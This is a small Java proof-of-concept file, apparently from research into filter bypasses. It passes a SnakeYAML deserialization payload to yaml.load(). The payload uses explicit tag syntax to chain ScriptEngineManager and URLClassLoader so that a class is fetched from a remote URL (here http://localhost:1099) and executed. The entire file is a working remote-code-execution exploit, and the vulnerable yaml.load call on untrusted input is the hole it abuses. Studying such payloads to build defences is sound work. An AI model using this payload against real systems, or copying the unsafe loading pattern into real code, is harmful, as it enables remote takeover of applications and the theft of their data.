package BypassAnalyze;

import org.yaml.snakeyaml.Yaml;

public class tag {
    public static void main(String[] args) {
        String payload = "!<tag:yaml.org,2002:javax.script.ScriptEngineManager> " +
                "[!<tag:yaml.org,2002:java.net.URLClassLoader> " +
                "[[!<tag:yaml.org,2002:java.net.URL> [\"http://localhost:1099\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
